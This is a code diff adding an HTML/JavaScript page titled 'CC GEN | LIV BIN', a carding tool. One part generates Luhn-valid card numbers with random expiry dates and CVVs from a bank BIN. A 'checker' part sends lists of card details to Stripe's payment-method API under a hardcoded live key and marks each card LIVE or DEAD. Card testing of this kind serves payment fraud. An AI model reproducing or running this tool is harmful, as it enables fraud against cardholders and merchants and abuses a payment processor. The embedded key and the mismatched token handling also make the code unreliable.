@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CC GEN | LIV BIN</title>
+    <script src="https://js.stripe.com/v3/"></script>
+    <style>
+        :root { --primary: #6772e5; --dark: #0a0a0a; --gray: #1a1a1a; --success: #2ecc71; --error: #e74c3c; }
+        body { font-family: sans-serif; background: var(--dark); color: white; margin: 0; text-align: center; }
+        .header { background: var(--gray); padding: 20px; color: var(--primary); font-size: 22px; font-weight: bold; border-bottom: 2px solid var(--primary); }
+        .nav { display: flex; justify-content: center; background: #111; padding: 10px; gap: 15px; }
+        .nav-btn { cursor: pointer; padding: 8px 15px; border-radius: 4px; font-weight: bold; }
+        .nav-btn.active { background: var(--primary); }
+        .container { padding: 20px; display: flex; justify-content: center; }
+        .card-box { background: var(--gray); padding: 20px; border-radius: 12px; width: 100%; max-width: 450px; }
+        textarea, input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; cursor: pointer; font-weight: bold; }
+        #results { margin-top: 15px; text-align: left; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; background: #050505; padding: 10px; }
+        .live { color: var(--success); margin: 5px 0; border-bottom: 1px solid #222; }
+        .die { color: var(--error); margin: 5px 0; border-bottom: 1px solid #222; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">CC GEN | LIV BIN</div>
+<div class="nav">
+    <div id="btn-gen" class="nav-btn active" onclick="showTab('gen')">GENERATOR</div>
+    <div id="btn-check" class="nav-btn" onclick="showTab('check')">CHECKER</div>
+</div>
+
+<div class="container">
+    <div id="gen-section" class="card-box">
+        <input type="text" id="binInput" placeholder="Enter BIN (e.g. 473702)">
+        <input type="number" id="countInput" value="10">
+        <button onclick="generateCC()">GENERATE</button>
+        <div id="results-gen" style="margin-top:10px; color:#0f0; text-align:left; font-size:12px; white-space:pre;"></div>
+    </div>
+
+    <div id="check-section" class="card-box hidden">
+        <textarea id="cardList" placeholder="NUMBER|MM|YYYY|CVV"></textarea>
+        <button id="checkBtn" onclick="processChecker()">START CHECKING</button>
+        <div id="results"></div>
+    </div>
+</div>
+
+<script>
+    const stripe = Stripe('pk_live_51St5NJ3QxD6C0jO3YL6CQgjbEzdwjKSyTkhhgn9tD4hl5eNuRP8F4EbjkGBR1lqa5xsmw1E0GgBfbv2JliktLPFD000l3uZ3Mi');
+
+    function showTab(tab) {
+        if(tab === 'gen') {
+            document.getElementById('gen-section').classList.remove('hidden');
+            document.getElementById('check-section').classList.add('hidden');
+            document.getElementById('btn-gen').classList.add('active');
+            document.getElementById('btn-check').classList.remove('active');
+        } else {
+            document.getElementById('check-section').classList.remove('hidden');
+            document.getElementById('gen-section').classList.add('hidden');
+            document.getElementById('btn-check').classList.add('active');
+            document.getElementById('btn-gen').classList.remove('active');
+        }
+    }
+
+    function generateCC() {
+        let bin = document.getElementById('binInput').value;
+        let count = document.getElementById('countInput').value;
+        let out = "";
+        for(let i=0; i<count; i++) {
+            let card = bin;
+            while(card.length < 15) card += Math.floor(Math.random() * 10);
+            let sum = 0;
+            for(let j=0; j<card.length; j++) {
+                let d = parseInt(card[card.length-1-j]);
+                if(j%2==0) { d *= 2; if(d>9) d -= 9; }
+                sum += d;
+            }
+            let checkDigit = (10 - (sum % 10)) % 10;
+            let m = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+            let y = 2026 + Math.floor(Math.random() * 5);
+            let c = Math.floor(Math.random() * 899) + 100;
+            out += `${card}${checkDigit}|${m}|${y}|${c}\n`;
+        }
+        document.getElementById('results-gen').innerText = out;
+    }
+
+    async function processChecker() {
+        const input = document.getElementById('cardList').value;
+        const lines = input.split('\n');
+        const resDiv = document.getElementById('results');
+        const btn = document.getElementById('checkBtn');
+        
+        btn.disabled = true;
+        resDiv.innerHTML = "<b>Status: Checking...</b><br>";
+
+        for(let line of lines) {
+            let data = line.trim();
+            if(!data || !data.includes('|')) continue;
+            let p = data.split('|');
+            
+            // Year fix (28 to 2028)
+            let year = p[2].trim();
+            if(year.length === 2) year = "20" + year;
+
+            try {
+                const res = await stripe.paymentMethods.create({
+                    card: {
+                        number: p[0].trim(),
+                        exp_month: p[1].trim(),
+                        exp_year: year,
+                        cvc: p[3].trim()
+                    }
+                });
+
+                if(res.error) {
+                    resDiv.innerHTML += `<div class="die">❌ DEAD | ${p[0]} | ${res.error.message}</div>`;
+                } else {
+                    resDiv.innerHTML += `<div class="live">✅ LIVE | ${p[0]} | Token: ${res.token.id}</div>`;
+                }
+            } catch(e) { 
+                resDiv.innerHTML += `<div class="die">🚫 System Error: Check Domain or Key</div>`;
+            }
+        }
+        btn.disabled = false;
+    }
+</script>
+</body>
+</html>
